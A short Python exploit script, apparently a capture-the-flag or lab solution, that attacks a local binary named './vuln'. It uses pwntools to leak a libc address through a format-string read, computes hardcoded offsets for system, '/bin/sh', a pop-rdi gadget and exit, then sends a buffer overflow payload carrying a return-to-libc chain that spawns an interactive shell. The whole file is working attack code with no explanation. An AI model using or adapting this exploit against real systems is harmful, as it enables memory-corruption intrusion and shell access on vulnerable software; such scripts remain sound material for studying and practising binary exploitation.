#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./vuln", stdin=PTY)

# Leak a libc address
p.sendline("%5$p")
libc_base = int(p.recvline(), 16) - 0x1bebe0

# Calculate other addresses
system = p64(libc_base + 0x48df0)
bin_sh = p64(libc_base + 0x18a156)
pop_rdi = p64(libc_base + 0x26796)
exit = p64(libc_base + 0x3e600)

# Create the payload
payload = b'quit'
payload += b'A'*116
payload += pop_rdi
payload += bin_sh
payload += system
payload += exit

# Trigger the buffer overflow
p.sendline(payload)
p.interactive()
